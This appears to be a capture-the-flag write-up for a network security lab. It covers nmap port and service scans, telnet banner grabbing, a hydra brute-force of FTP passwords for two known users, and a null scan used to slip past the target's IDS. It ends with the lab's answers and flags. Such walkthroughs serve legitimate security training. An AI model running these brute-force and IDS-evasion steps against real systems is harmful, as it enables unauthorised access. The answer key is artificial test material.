# Net Sec Challenge

### Method

Perform service scan on target with nmap:

`nmap -sV <TARGET-IP>`

Discover ports and flag in SSH header.

Run scan for ports > 10000:

`nmap -sS -p10000-65535`

Discover FTP server on non-default port 10021.

Use telnet to connect to HTTP server:

```
telnet <TARGET-IP> 80
GET / HTTP/1.1
host: telnet
```

Grab flag from header

Use telnet to connect to FTP server:

`telnet <TARGET-IP> 10021`

Grab vsFTPd version

Brute force FTP user's passwords with hydra:

```
echo -n "eddie\nquinn" > ftp-users.txt
hydra -L ftp-users.txt -P rockyou.txt <TARGET-IP> ftp -s 10021
```

Log in as users to grab flag from FTP server.

Navigate to `<TARGET-IP>:8080` and scan target with nmap:

`nmap -sS <TARGET-IP>`

Sets off IDS so try a null scan:

`nmap -sN <TARGET-IP>`

Scanned target undetected, grab flag from page

### Questions

What is the highest port number being open less than 10,000?

8080

There is an open port outside the common 1000 ports; it is above 10,000. What is it?

10021

How many TCP ports are open?

6

What is the flag hidden in the HTTP server header?

THM{web_server_25352}

What is the flag hidden in the SSH server header?

THM{946219583339}

We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

vsFTPd 3.0.3

We learned two usernames using social engineering: eddie and quinn. What is the flag hidden 
in one of these two account files and accessible via FTP?

THM{321452667098}

Browsing to http://10.10.169.240:8080 displays a small challenge that will give you a flag 
once you solve it. What is the flag?

THM{f7443f99}
